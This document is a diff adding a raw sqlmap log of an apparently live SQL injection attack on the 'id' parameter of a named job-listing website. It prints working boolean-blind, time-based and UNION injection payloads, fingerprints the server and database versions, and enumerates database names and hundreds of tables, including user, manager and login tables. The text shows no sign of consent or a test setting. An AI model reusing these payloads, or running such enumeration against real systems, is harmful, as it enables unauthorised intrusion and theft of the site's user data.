@@ -1,0 +1,435 @@
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-8d1e1ea}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 04:08:55
+
+[04:08:55] [INFO] resuming back-end DBMS 'microsoft sql server' 
+[04:08:55] [INFO] testing connection to the target URL
+sqlmap got a 302 redirect to 'http://www.job088.com:80/index.html'. Do you want to follow? [Y/n] [04:09:22] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-4173 OR 7053=7053
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: id=143351858 AND 9926=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: id=143351858 UNION ALL SELECT NULL,CHAR(113)+CHAR(122)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(121)+CHAR(119)+CHAR(66)+CHAR(118)+CHAR(99)+CHAR(105)+CHAR(116)+CHAR(121)+CHAR(82)+CHAR(71)+CHAR(87)+CHAR(80)+CHAR(102)+CHAR(89)+CHAR(89)+CHAR(82)+CHAR(106)+CHAR(77)+CHAR(90)+CHAR(76)+CHAR(100)+CHAR(118)+CHAR(85)+CHAR(90)+CHAR(79)+CHAR(110)+CHAR(67)+CHAR(101)+CHAR(79)+CHAR(77)+CHAR(67)+CHAR(114)+CHAR(74)+CHAR(75)+CHAR(100)+CHAR(65)+CHAR(117)+CHAR(80)+CHAR(87)+CHAR(111)+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[04:09:23] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: Microsoft SQL Server 2005
+[04:09:23] [INFO] fetching database names
+[04:09:23] [INFO] the SQL query used returns 13 entries
+[04:09:23] [INFO] resumed: "AdventureWorksDW"
+[04:09:23] [INFO] resumed: "AdventureWorksDW"
+[04:09:23] [INFO] resumed: "hdrc22"
+[04:09:23] [INFO] resumed: "hdrc22"
+[04:09:23] [INFO] resumed: "job0881"
+[04:09:23] [INFO] resumed: "kf"
+[04:09:23] [INFO] resumed: "master"
+[04:09:23] [INFO] resumed: "model"
+[04:09:23] [INFO] resumed: "msdb"
+[04:09:23] [INFO] resumed: "ReportServer"
+[04:09:23] [INFO] resumed: "ReportServerTempDB"
+[04:09:23] [INFO] resumed: "tempdb"
+[04:09:23] [INFO] resumed: "train"
+[04:09:23] [INFO] fetching tables for databases: AdventureWorksDW, ReportServer, ReportServerTempDB, hdrc22, job0881, kf, master, model, msdb, tempdb, train
+[04:09:52] [INFO] the SQL query used returns 6 entries
+[04:10:12] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[04:10:21] [INFO] the SQL query used returns 6 entries
+[04:10:30] [INFO] the SQL query used returns 2 entries
+[04:10:30] [INFO] retrieved: dbo.#6D45AC96
+[04:10:43] [INFO] retrieved: dbo.#6E39D0CF
+[04:10:44] [INFO] the SQL query used returns 3 entries
+[04:11:00] [INFO] retrieved: dbo.fzr
+[04:11:01] [INFO] retrieved: dbo.kfzb2010
+[04:11:14] [INFO] retrieved: dbo.kfzb2010
+[04:11:15] [INFO] the SQL query used returns 11 entries
+[04:11:24] [INFO] retrieved: dbo.aboutus
+[04:11:44] [INFO] retrieved: dbo.config
+[04:11:45] [INFO] retrieved: dbo.guestbook
+[04:11:46] [INFO] retrieved: dbo.index_class
+[04:11:56] [INFO] retrieved: dbo.index_news
+[04:11:56] [INFO] retrieved: dbo.manager
+[04:12:05] [INFO] retrieved: dbo.n_class
+[04:12:09] [INFO] retrieved: dbo.p_news
+[04:12:11] [INFO] retrieved: dbo.p_upfile
+[04:12:11] [INFO] retrieved: dbo.p_user
+[04:12:45] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:12:49] [INFO] retrieved: dbo.signUp
+[04:12:53] [INFO] the SQL query used returns 11 entries
+[04:13:23] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:13:25] [INFO] retrieved: dbo.BUSINESS
+[04:13:30] [INFO] retrieved: dbo.COMPANY
+[04:13:30] [INFO] retrieved: dbo.COMTYPE
+[04:13:31] [INFO] retrieved: dbo.Customer
+[04:13:31] [INFO] retrieved: dbo.FILE
+[04:13:32] [INFO] retrieved: dbo.history
+[04:13:33] [INFO] retrieved: dbo.JOBMEMBER
+[04:13:34] [INFO] retrieved: dbo.JOBMSG
+[04:13:35] [INFO] retrieved: dbo.JOBTYPE
+[04:13:35] [INFO] retrieved: dbo.LOCALSTUDENT
+[04:13:47] [INFO] retrieved: dbo.TALENTS
+[04:13:48] [INFO] the SQL query used returns 92 entries
+[04:13:49] [INFO] retrieved: dbo.backupfilegroup
+[04:14:05] [INFO] retrieved: dbo.backupfilegroup
+[04:14:06] [INFO] retrieved: dbo.backupmediafamily
+[04:14:15] [INFO] retrieved: dbo.backupmediaset
+[04:14:29] [INFO] retrieved: dbo.backupset
+[04:14:50] [INFO] retrieved: dbo.log_shipping_monitor_alert
+[04:14:51] [INFO] retrieved: dbo.log_shipping_monitor_error_detail
+[04:14:55] [INFO] retrieved: dbo.log_shipping_monitor_history_detail
+[04:14:56] [INFO] retrieved: dbo.log_shipping_monitor_primary
+[04:14:56] [INFO] retrieved: dbo.log_shipping_monitor_secondary
+[04:14:57] [INFO] retrieved: dbo.log_shipping_primaries
+[04:15:06] [INFO] retrieved: dbo.log_shipping_primary_databases
+[04:15:07] [INFO] retrieved: dbo.log_shipping_primary_secondaries
+[04:15:08] [INFO] retrieved: dbo.log_shipping_secondaries
+[04:15:13] [INFO] retrieved: dbo.log_shipping_secondary_databases
+[04:15:18] [INFO] retrieved: dbo.log_shipping_secondary_databases
+[04:15:18] [INFO] retrieved: dbo.logmarkhistory
+[04:15:20] [INFO] retrieved: dbo.MSdatatype_mappings
+[04:15:21] [INFO] retrieved: dbo.MSdbms_datatype_mapping
+[04:15:28] [INFO] retrieved: dbo.MSdbms_datatype_mapping
+[04:15:29] [INFO] retrieved: dbo.MSdbms_datatype_mapping
+[04:15:33] [INFO] retrieved: dbo.MSdbms_map
+[04:15:38] [INFO] retrieved: dbo.restorefilegroup
+[04:15:38] [INFO] retrieved: dbo.restorefilegroup
+[04:15:43] [INFO] retrieved: dbo.restorehistory
+[04:15:44] [INFO] retrieved: dbo.sqlagent_info
+[04:15:48] [INFO] retrieved: dbo.suspect_pages
+[04:15:49] [INFO] retrieved: dbo.sysalerts
+[04:16:21] [INFO] retrieved: dbo.syscachedcredentials
+[04:16:39] [INFO] retrieved: dbo.syscategories
+[04:16:48] [INFO] retrieved: dbo.sysdatatypemappings
+[04:16:49] [INFO] retrieved: dbo.sysdbmaintplan_databases
+[04:17:03] [INFO] retrieved: dbo.sysdbmaintplan_history
+[04:17:03] [INFO] retrieved: dbo.sysdbmaintplan_jobs
+[04:17:08] [INFO] retrieved: dbo.sysdbmaintplans
+[04:17:09] [INFO] retrieved: dbo.sysdownloadlist
+[04:17:16] [INFO] retrieved: dbo.sysdtscategories
+[04:17:21] [INFO] retrieved: dbo.sysdtslog90
+[04:17:26] [INFO] retrieved: dbo.sysdtspackagefolders90
+[04:17:27] [INFO] retrieved: dbo.sysdtspackagelog
+[04:17:31] [INFO] retrieved: dbo.sysdtspackages90
+[04:17:32] [INFO] retrieved: dbo.sysdtspackages90
+[04:17:36] [INFO] retrieved: dbo.sysdtssteplog
+[04:17:40] [INFO] retrieved: dbo.sysdtstasklog
+[04:17:41] [INFO] retrieved: dbo.sysjobactivity
+[04:17:43] [INFO] retrieved: dbo.sysjobhistory
+[04:17:43] [INFO] retrieved: dbo.sysjobs_view
+[04:18:04] [INFO] retrieved: dbo.sysjobs_view
+[04:18:04] [INFO] retrieved: dbo.sysjobschedules
+[04:18:05] [INFO] retrieved: dbo.sysjobservers
+[04:18:11] [INFO] retrieved: dbo.sysjobstepslogs
+[04:18:15] [INFO] retrieved: dbo.sysjobstepslogs
+[04:18:23] [INFO] retrieved: dbo.sysmail_account
+[04:18:32] [INFO] retrieved: dbo.sysmail_allitems
+[04:18:32] [INFO] retrieved: dbo.sysmail_attachments_transfer
+[04:18:33] [INFO] retrieved: dbo.sysmail_attachments_transfer
+[04:18:34] [INFO] retrieved: dbo.sysmail_configuration
+[04:18:40] [INFO] retrieved: dbo.sysmail_event_log
+[04:18:45] [INFO] retrieved: dbo.sysmail_faileditems
+[04:18:46] [INFO] retrieved: dbo.sysmail_log
+[04:18:50] [INFO] retrieved: dbo.sysmail_mailattachments
+[04:18:55] [INFO] retrieved: dbo.sysmail_mailitems
+[04:18:57] [INFO] retrieved: dbo.sysmail_principalprofile
+[04:18:58] [INFO] retrieved: dbo.sysmail_profileaccount
+[04:18:59] [INFO] retrieved: dbo.sysmail_profileaccount
+[04:18:59] [INFO] retrieved: dbo.sysmail_query_transfer
+[04:19:01] [INFO] retrieved: dbo.sysmail_send_retries
+[04:19:16] [INFO] retrieved: dbo.sysmail_sentitems
+[04:19:27] [INFO] retrieved: dbo.sysmail_server
+[04:19:32] [INFO] retrieved: dbo.sysmail_servertype
+[04:19:33] [INFO] retrieved: dbo.sysmail_unsentitems
+[04:19:34] [INFO] retrieved: dbo.sysmaintplan_logdetail
+[04:19:35] [INFO] retrieved: dbo.sysmaintplan_logdetail
+[04:19:35] [INFO] retrieved: dbo.sysmaintplan_plans
+[04:19:45] [INFO] retrieved: dbo.sysmaintplan_subplans
+[04:19:52] [INFO] retrieved: dbo.sysnotifications
+[04:19:59] [INFO] retrieved: dbo.sysoperators
+[04:20:08] [INFO] retrieved: dbo.sysoriginatingservers_view
+[04:20:09] [INFO] retrieved: dbo.sysoriginatingservers_view
+[04:20:10] [INFO] retrieved: dbo.sysproxies
+[04:20:18] [INFO] retrieved: dbo.sysproxylogin
+[04:20:18] [INFO] retrieved: dbo.sysproxyloginsubsystem_view
+[04:20:19] [INFO] retrieved: dbo.sysproxysubsystem
+[04:20:20] [INFO] retrieved: dbo.sysschedules_localserver_view
+[04:20:20] [INFO] retrieved: dbo.sysschedules_localserver_view
+[04:20:32] [INFO] retrieved: dbo.syssessions
+[04:20:33] [INFO] retrieved: dbo.syssubsystems
+[04:20:34] [INFO] retrieved: dbo.systargetservergroupmembers
+[04:20:41] [INFO] retrieved: dbo.systargetservergroups
+[04:20:53] [INFO] retrieved: dbo.systargetservers_view
+[04:21:23] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:21:28] [INFO] retrieved: dbo.systargetservers_view
+[04:21:28] [INFO] retrieved: dbo.systaskids
+[04:21:29] [INFO] the SQL query used returns 30 entries
+[04:22:01] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:23:07] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:23:14] [INFO] the SQL query used returns 25 entries
+[04:23:52] [INFO] the SQL query used returns 27 entries
+[04:25:30] [INFO] the SQL query used returns 27 entries
+[04:25:59] [INFO] the SQL query used returns 290 entries
+[04:25:59] [INFO] retrieved: dbo.MSreplication_options
+[04:26:07] [INFO] retrieved: dbo.spt_fallback_db
+[04:26:22] [INFO] retrieved: dbo.spt_fallback_dev
+[04:26:29] [INFO] retrieved: dbo.spt_fallback_usg
+[04:26:33] [INFO] retrieved: dbo.spt_monitor
+[04:26:34] [INFO] retrieved: dbo.spt_values
+[04:26:38] [INFO] retrieved: INFORMATION_SCHEMA.CHECK_CONSTRAINTS
+[04:26:51] [INFO] retrieved: INFORMATION_SCHEMA.COLUMN_DOMAIN_USAGE
+[04:26:52] [INFO] retrieved: INFORMATION_SCHEMA.COLUMN_PRIVILEGES
+[04:26:52] [INFO] retrieved: INFORMATION_SCHEMA.COLUMNS
+[04:26:57] [INFO] retrieved: INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE
+[04:26:58] [INFO] retrieved: INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE
+[04:26:58] [INFO] retrieved: INFORMATION_SCHEMA.DOMAIN_CONSTRAINTS
+[04:26:59] [INFO] retrieved: INFORMATION_SCHEMA.DOMAINS
+[04:27:00] [INFO] retrieved: INFORMATION_SCHEMA.KEY_COLUMN_USAGE
+[04:27:05] [INFO] retrieved: INFORMATION_SCHEMA.PARAMETERS
+[04:27:09] [INFO] retrieved: INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS
+[04:27:09] [INFO] retrieved: INFORMATION_SCHEMA.ROUTINE_COLUMNS
+[04:27:14] [INFO] retrieved: INFORMATION_SCHEMA.ROUTINES
+[04:27:14] [INFO] retrieved: INFORMATION_SCHEMA.SCHEMATA
+[04:27:16] [INFO] retrieved: INFORMATION_SCHEMA.TABLE_CONSTRAINTS
+[04:27:26] [INFO] retrieved: INFORMATION_SCHEMA.TABLE_PRIVILEGES
+[04:27:31] [INFO] retrieved: INFORMATION_SCHEMA.TABLES
+[04:27:40] [INFO] retrieved: INFORMATION_SCHEMA.VIEW_COLUMN_USAGE
+[04:27:45] [INFO] retrieved: INFORMATION_SCHEMA.VIEW_TABLE_USAGE
+[04:27:56] [INFO] retrieved: INFORMATION_SCHEMA.VIEWS
+[04:27:57] [INFO] retrieved: sys.all_columns
+[04:27:57] [INFO] retrieved: sys.all_objects
+[04:27:58] [INFO] retrieved: sys.all_parameters
+[04:27:59] [INFO] retrieved: sys.all_sql_modules
+[04:28:03] [INFO] retrieved: sys.all_views
+[04:28:04] [INFO] retrieved: sys.allocation_units
+[04:28:05] [INFO] retrieved: sys.assemblies
+[04:28:06] [INFO] retrieved: sys.assembly_files
+[04:28:19] [INFO] retrieved: sys.assembly_modules
+[04:28:20] [INFO] retrieved: sys.assembly_references
+[04:28:21] [INFO] retrieved: sys.assembly_types
+[04:28:22] [INFO] retrieved: sys.asymmetric_keys
+[04:28:26] [INFO] retrieved: sys.backup_devices
+[04:28:30] [INFO] retrieved: sys.certificates
+[04:28:38] [INFO] retrieved: sys.check_constraints
+[04:28:47] [INFO] retrieved: sys.column_type_usages
+[04:28:48] [INFO] retrieved: sys.column_xml_schema_collection_usages
+[04:28:52] [INFO] retrieved: sys.columns
+[04:28:59] [INFO] retrieved: sys.computed_columns
+[04:28:59] [INFO] retrieved: sys.configurations
+[04:29:00] [INFO] retrieved: sys.conversation_endpoints
+[04:29:01] [INFO] retrieved: sys.conversation_groups
+[04:29:04] [INFO] retrieved: sys.credentials
+[04:29:35] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:29:36] [INFO] retrieved: sys.crypt_properties
+[04:29:41] [INFO] retrieved: sys.data_spaces
+[04:29:42] [INFO] retrieved: sys.database_files
+[04:29:50] [INFO] retrieved: sys.database_mirroring_endpoints
+[04:29:57] [INFO] retrieved: sys.database_mirroring_endpoints
+[04:29:58] [INFO] retrieved: sys.database_mirroring_witnesses
+[04:29:59] [INFO] retrieved: sys.database_permissions
+[04:30:07] [INFO] retrieved: sys.database_principal_aliases
+[04:30:09] [INFO] retrieved: sys.database_principals
+[04:30:39] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:30:40] [INFO] retrieved: sys.database_recovery_status
+[04:30:41] [INFO] retrieved: sys.database_role_members
+[04:30:44] [INFO] retrieved: sys.databases
+[04:30:49] [INFO] retrieved: sys.default_constraints
+[04:30:50] [INFO] retrieved: sys.destination_data_spaces
+[04:31:11] [INFO] retrieved: sys.dm_broker_activated_tasks
+[04:31:12] [INFO] retrieved: sys.dm_broker_connections
+[04:31:27] [INFO] retrieved: sys.dm_broker_forwarded_messages
+[04:31:28] [INFO] retrieved: sys.dm_broker_queue_monitors
+[04:31:29] [INFO] retrieved: sys.dm_clr_appdomains
+[04:31:29] [INFO] retrieved: sys.dm_clr_loaded_assemblies
+[04:31:39] [INFO] retrieved: sys.dm_clr_properties
+[04:31:50] [INFO] retrieved: sys.dm_clr_tasks
+[04:31:51] [INFO] retrieved: sys.dm_db_file_space_usage
+[04:31:58] [INFO] retrieved: sys.dm_db_index_usage_stats
+[04:32:11] [INFO] retrieved: sys.dm_db_mirroring_connections
+[04:32:24] [INFO] retrieved: sys.dm_db_missing_index_details
+[04:32:25] [INFO] retrieved: sys.dm_db_missing_index_group_stats
+[04:32:28] [INFO] retrieved: sys.dm_db_missing_index_groups
+[04:32:29] [INFO] retrieved: sys.dm_db_partition_stats
+[04:32:34] [INFO] retrieved: sys.dm_db_session_space_usage
+[04:32:42] [INFO] retrieved: sys.dm_db_task_space_usage
+[04:32:47] [INFO] retrieved: sys.dm_exec_background_job_queue_stats
+[04:32:48] [INFO] retrieved: sys.dm_exec_background_job_queue_stats
+[04:32:48] [INFO] retrieved: sys.dm_exec_cached_plans
+[04:32:49] [INFO] retrieved: sys.dm_exec_connections
+[04:32:54] [INFO] retrieved: sys.dm_exec_query_optimizer_info
+[04:32:57] [INFO] retrieved: sys.dm_exec_query_stats
+[04:32:58] [INFO] retrieved: sys.dm_exec_query_transformation_stats
+[04:32:59] [INFO] retrieved: sys.dm_exec_requests
+[04:33:03] [INFO] retrieved: sys.dm_exec_sessions
+[04:33:04] [INFO] retrieved: sys.dm_fts_active_catalogs
+[04:33:05] [INFO] retrieved: sys.dm_fts_index_population
+[04:33:06] [INFO] retrieved: sys.dm_fts_memory_buffers
+[04:33:07] [INFO] retrieved: sys.dm_fts_memory_pools
+[04:33:23] [INFO] retrieved: sys.dm_fts_population_ranges
+[04:33:24] [INFO] retrieved: sys.dm_io_backup_tapes
+[04:33:25] [INFO] retrieved: sys.dm_io_cluster_shared_drives
+[04:33:26] [INFO] retrieved: sys.dm_io_pending_io_requests
+[04:33:29] [INFO] retrieved: sys.dm_os_buffer_descriptors
+[04:33:30] [INFO] retrieved: sys.dm_os_child_instances
+[04:33:34] [INFO] retrieved: sys.dm_os_cluster_nodes
+[04:33:41] [INFO] retrieved: sys.dm_os_hosts
+[04:33:42] [INFO] retrieved: sys.dm_os_latch_stats
+[04:33:50] [INFO] retrieved: sys.dm_os_loaded_modules
+[04:33:51] [INFO] retrieved: sys.dm_os_memory_allocations
+[04:33:52] [INFO] retrieved: sys.dm_os_memory_cache_clock_hands
+[04:33:56] [INFO] retrieved: sys.dm_os_memory_cache_counters
+[04:33:57] [INFO] retrieved: sys.dm_os_memory_cache_entries
+[04:34:01] [INFO] retrieved: sys.dm_os_memory_cache_hash_tables
+[04:34:02] [INFO] retrieved: sys.dm_os_memory_clerks
+[04:34:07] [INFO] retrieved: sys.dm_os_memory_objects
+[04:34:07] [INFO] retrieved: sys.dm_os_memory_pools
+[04:34:08] [INFO] retrieved: sys.dm_os_performance_counters
+[04:34:42] [INFO] retrieved: sys.dm_os_ring_buffers
+[04:34:42] [INFO] retrieved: sys.dm_os_schedulers
+[04:34:43] [INFO] retrieved: sys.dm_os_stacks
+[04:34:44] [INFO] retrieved: sys.dm_os_sublatches
+[04:34:45] [INFO] retrieved: sys.dm_os_sys_info
+[04:34:54] [INFO] retrieved: sys.dm_os_tasks
+[04:34:58] [INFO] retrieved: sys.dm_os_threads
+[04:34:58] [INFO] retrieved: sys.dm_os_virtual_address_dump
+[04:35:00] [INFO] retrieved: sys.dm_os_wait_stats
+[04:35:01] [INFO] retrieved: sys.dm_os_waiting_tasks
+[04:35:02] [INFO] retrieved: sys.dm_os_worker_local_storage
+[04:35:04] [INFO] retrieved: sys.dm_os_workers
+[04:35:04] [INFO] retrieved: sys.dm_qn_subscriptions
+[04:35:06] [INFO] retrieved: sys.dm_repl_articles
+[04:35:06] [INFO] retrieved: sys.dm_repl_schemas
+[04:35:07] [INFO] retrieved: sys.dm_repl_tranhash
+[04:35:08] [INFO] retrieved: sys.dm_repl_traninfo
+[04:35:15] [INFO] retrieved: sys.dm_tran_active_snapshot_database_transactions
+[04:35:46] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:35:59] [INFO] retrieved: sys.dm_tran_active_transactions
+[04:36:09] [INFO] retrieved: sys.dm_tran_current_snapshot
+[04:36:22] [INFO] retrieved: sys.dm_tran_current_transaction
+[04:36:36] [INFO] retrieved: sys.dm_tran_database_transactions
+[04:36:41] [INFO] retrieved: sys.dm_tran_locks
+[04:36:42] [INFO] retrieved: sys.dm_tran_session_transactions
+[04:36:43] [INFO] retrieved: sys.dm_tran_top_version_generators
+[04:36:43] [INFO] retrieved: sys.dm_tran_transactions_snapshot
+[04:36:47] [INFO] retrieved: sys.dm_tran_version_store
+[04:36:49] [INFO] retrieved: sys.endpoint_webmethods
+[04:36:49] [INFO] retrieved: sys.endpoints
+[04:36:50] [INFO] retrieved: sys.event_notification_event_types
+[04:36:51] [INFO] retrieved: sys.event_notifications
+[04:36:55] [INFO] retrieved: sys.events
+[04:37:36] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s)
+[04:37:37] [INFO] retrieved: sys.extended_procedures
+[04:37:37] [INFO] retrieved: sys.extended_properties
+[04:37:42] [INFO] retrieved: sys.filegroups
+[04:37:42] [INFO] retrieved: sys.foreign_key_columns
+[04:37:43] [INFO] retrieved: sys.foreign_keys
+[04:37:54] [INFO] retrieved: sys.fulltext_catalogs
+[04:37:58] [INFO] retrieved: sys.fulltext_document_types
+[04:38:07] [INFO] retrieved: sys.fulltext_index_catalog_usages
+[04:38:08] [INFO] retrieved: sys.fulltext_index_columns
+[04:38:08] [INFO] retrieved: sys.fulltext_indexes
+[04:38:10] [INFO] retrieved: sys.fulltext_languages
+[04:38:21] [INFO] retrieved: sys.http_endpoints
+[04:38:26] [INFO] retrieved: sys.identity_columns
+[04:38:26] [INFO] retrieved: sys.index_columns
+[04:38:36] [INFO] retrieved: sys.indexes
+[04:38:44] [INFO] retrieved: sys.internal_tables
+[04:38:49] [INFO] retrieved: sys.key_constraints
+[04:38:56] [INFO] retrieved: sys.key_encryptions
+[04:38:57] [INFO] retrieved: sys.linked_logins
+[04:39:22] [INFO] retrieved: sys.login_token
+[04:39:23] [INFO] retrieved: sys.master_files
+[04:39:28] [INFO] retrieved: sys.master_key_passwords
+[04:39:55] [INFO] retrieved: sys.message_type_xml_schema_collection_usages
+[04:39:55] [INFO] retrieved: sys.messages
+[04:39:56] [INFO] retrieved: sys.module_assembly_usages
+[04:40:00] [INFO] retrieved: sys.numbered_procedure_parameters
+[04:40:09] [INFO] retrieved: sys.numbered_procedures
+[04:40:11] [INFO] retrieved: sys.objects
+[04:40:11] [INFO] retrieved: sys.openkeys
+[04:40:12] [INFO] retrieved: sys.parameter_type_usages
+[04:40:16] [INFO] retrieved: sys.parameter_xml_schema_collection_usages
+[04:40:21] [INFO] retrieved: sys.parameters
+[04:40:22] [INFO] retrieved: sys.partition_functions
+[04:40:34] [INFO] retrieved: sys.partition_parameters
+[04:40:35] [INFO] retrieved: sys.partition_range_values
+[04:40:42] [INFO] retrieved: sys.partition_schemes
+[04:40:47] [INFO] retrieved: sys.partitions
+[04:40:51] [INFO] retrieved: sys.plan_guides
+[04:41:00] [INFO] retrieved: sys.procedures
+[04:41:16] [INFO] retrieved: sys.remote_logins
+[04:41:16] [INFO] retrieved: sys.remote_service_bindings
+[04:41:47] [INFO] retrieved: sys.routes
+[04:41:49] [INFO] retrieved: sys.schemas
+[04:41:50] [INFO] retrieved: sys.securable_classes
+[04:41:55] [INFO] retrieved: sys.server_assembly_modules
+[04:41:56] [INFO] retrieved: sys.server_event_notifications
+[04:42:00] [INFO] retrieved: sys.server_events
+[04:42:05] [INFO] retrieved: sys.server_permissions
+[04:42:06] [INFO] retrieved: sys.server_principals
+[04:42:06] [INFO] retrieved: sys.server_role_members
+[04:42:11] [INFO] retrieved: sys.server_sql_modules
+[04:42:17] [INFO] retrieved: sys.server_trigger_events
+[04:42:41] [INFO] retrieved: sys.server_triggers
+[04:42:46] [INFO] retrieved: sys.servers
+[04:42:51] [INFO] retrieved: sys.service_broker_endpoints
+[04:42:55] [INFO] retrieved: sys.service_contract_message_usages
+[04:43:09] [INFO] retrieved: sys.service_contract_usages
+[04:43:14] [INFO] retrieved: sys.service_contracts
+[04:43:18] [INFO] retrieved: sys.service_message_types
+[04:43:29] [INFO] retrieved: sys.service_queue_usages
+[04:43:41] [INFO] retrieved: sys.service_queues
+[04:43:45] [INFO] retrieved: sys.services
+[04:43:46] [INFO] retrieved: sys.soap_endpoints
+[04:43:51] [INFO] retrieved: sys.sql_dependencies
+[04:44:06] [INFO] retrieved: sys.sql_logins
+[04:44:18] [INFO] retrieved: sys.sql_modules
+[04:44:23] [INFO] retrieved: sys.stats_columns
+[04:44:24] [INFO] retrieved: sys.stats_columns
+[04:44:25] [INFO] retrieved: sys.symmetric_keys
+[04:44:29] [INFO] retrieved: sys.synonyms
+[04:44:30] [INFO] retrieved: sys.sysaltfiles
+[04:44:31] [INFO] retrieved: sys.syscacheobjects
+[04:44:35] [INFO] retrieved: sys.syscharsets
+[04:44:51] [INFO] retrieved: sys.syscolumns
+[04:44:55] [INFO] retrieved: sys.syscomments
+[04:45:07] [INFO] retrieved: sys.sysconfigures
+[04:45:11] [INFO] retrieved: sys.sysconstraints
+[04:45:16] [INFO] retrieved: sys.syscurconfigs
+[04:45:17] [INFO] retrieved: sys.syscursorcolumns
+[04:45:32] [INFO] retrieved: sys.syscursorrefs
+[04:45:37] [INFO] retrieved: sys.syscursors
+[04:46:02] [INFO] retrieved: sys.syscursortables
+[04:46:14] [INFO] retrieved: sys.sysdatabases
+[04:46:19] [INFO] retrieved: sys.sysdepends
+[04:46:20] [INFO] retrieved: sys.sysdevices
+[04:46:28] [INFO] retrieved: sys.sysfilegroups
+[04:46:28] [INFO] retrieved: sys.sysfiles
+[04:46:29] [INFO] retrieved: sys.sysforeignkeys
+[04:46:42] [INFO] retrieved: sys.sysfulltextcatalogs
+[04:46:43] [INFO] retrieved: sys.sysindexes
+[04:46:44] [INFO] retrieved: sys.sysindexkeys
+[04:46:45] [INFO] retrieved: sys.syslanguages
+[04:46:54] [INFO] retrieved: sys.syslockinfo
+[04:47:05] [INFO] retrieved: sys.syslogins
+[04:47:12] [INFO] retrieved: sys.sysmembers
+[04:47:18] [INFO] retrieved: sys.sysmessages
+[04:47:19] [INFO] retrieved: sys.sysobjects
+[04:47:34] [INFO] retrieved: sys.sysoledbusers
+[04:47:39] [INFO] retrieved: sys.sysopentapes
+[04:47:39] [INFO] retrieved: sys.sysperfinfo
+[04:47:41] [INFO] retrieved: sys.syspermissions
+[04:47:42] [INFO] retrieved: sys.sysprocesses
